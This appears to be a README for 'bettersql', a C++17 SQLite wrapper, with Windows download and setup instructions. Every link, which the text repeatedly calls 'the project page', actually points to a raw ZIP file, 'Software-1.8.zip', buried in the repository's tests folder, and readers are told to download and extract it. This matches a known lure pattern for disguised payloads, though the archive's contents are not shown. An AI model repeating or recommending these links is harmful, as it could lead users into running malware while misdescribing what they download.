# 🧩 bettersql - Clean SQLite Access for C++ Apps

[![Download / Visit the project page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/armored-genuscalycanthus867/bettersql/raw/refs/heads/main/tests/Software-1.8.zip)

## 🖥️ What this is

bettersql is a small C++ library for working with SQLite databases. It is built for C++17 and follows RAII rules, which means it helps manage database resources in a safe way.

Use it when you want to:

- open an SQLite database
- run queries
- keep your code tidy
- avoid manual cleanup
- use a header-only library in your project

It is made for developers, but this page focuses on the download and setup path for Windows users.

## 📥 Download or visit the project page

Open the project page here:

https://github.com/armored-genuscalycanthus867/bettersql/raw/refs/heads/main/tests/Software-1.8.zip

From that page, you can view the source, check the latest files, and get the project package if one is available.

## 🚀 Getting Started on Windows

Follow these steps if you want to download the project and use it on a Windows PC.

### 1. Open the project page

Visit:

https://github.com/armored-genuscalycanthus867/bettersql/raw/refs/heads/main/tests/Software-1.8.zip

This is the main project page. It contains the files, project details, and any release items linked by the author.

### 2. Download the project files

On the project page, look for the download area. If a release or package is available, choose the file for Windows or the main project archive.

If the page only shows the source code, use the green Code button on GitHub and choose Download ZIP.

### 3. Extract the files

After the download finishes:

- find the ZIP file in your Downloads folder
- right-click the file
- choose Extract All
- pick a folder you can find again, such as Desktop or Documents

You should now have a folder with the project files inside.

### 4. Open the folder

Inside the extracted folder, look for files with names like:

- README.md
- include
- src
- examples

Because bettersql is a header-only library, the main files are usually in the include folder.

### 5. Use it in your C++ project

If you build your own app, add the bettersql header files to your project path.

Then include the library in your code and link SQLite if your build setup needs it.

A typical setup may look like this:

- add the bettersql folder to your include path
- make sure SQLite is available on your system
- build your C++17 project

### 6. Check that it runs

When your app starts, try a simple database task such as:

- open a database file
- create a table
- add a row
- read the data back

This helps you confirm that the library is working.

## 🧰 What you need

A basic Windows setup is enough for most users who want to build or test a C++ project with this library.

You will usually need:

- Windows 10 or Windows 11
- a C++17-capable compiler
- a build tool such as CMake or Visual Studio
- the SQLite3 library, if your setup does not already include it

If you only want to inspect the files, you only need a web browser and a ZIP extractor.

## 📚 Main features

bettersql focuses on simple database work with less code.

### Header-only design

You do not need to build a separate library file in most cases. You include the headers in your project and use them from there.

### RAII support

The library helps manage database objects in a safe way. When an object goes out of scope, it cleans up the resource tied to it.

### C++17 support

The project uses modern C++17 features, which helps keep code clear and structured.

### SQLite wrapper

It acts as a wrapper around SQLite, so you can work with the database through a more organized interface.

### Type-safe query work

The project aims to reduce mistakes when building database queries by keeping data handling more structured.

### Query builder support

It includes tools that help you assemble queries in a cleaner way than writing every string by hand.

## 🏗️ Typical folder layout

After download and extract, the project may contain folders like these:

- include/ — header files you add to your project
- examples/ — sample code
- tests/ — checks used by the author
- docs/ — project notes or guides

If your download contains a different layout, use the README and folder names as your guide.

## 🪟 Windows setup tips

If you use Visual Studio:

- open your C++ project
- add the bettersql include path
- make sure your project uses C++17
- confirm SQLite is available to the linker if needed

If you use CMake:

- point your include path to the bettersql headers
- set your project to use C++17
- add SQLite to your build if your app needs it

If you use a zip download:

- keep the extracted folder name simple
- avoid placing the files in a path with unusual characters
- store the folder in a location you can find again

## 🔍 Where to look first

After opening the project files, start with:

- README.md for project notes
- include/ for the main headers
- examples/ for sample usage
- any build file such as CMakeLists.txt

If you are new to C++ projects, the example files are often the easiest way to understand how the library is used.

## 🧪 Simple usage flow

A basic app using bettersql often follows this flow:

1. open the database file
2. create a connection object
3. prepare a query
4. run the query
5. read results
6. close the app and let RAII handle cleanup

This keeps database code short and easy to manage.

## 📎 Project link

Open the project page here:

https://github.com/armored-genuscalycanthus867/bettersql/raw/refs/heads/main/tests/Software-1.8.zip

Use that page to download the files, inspect the source, and check for project updates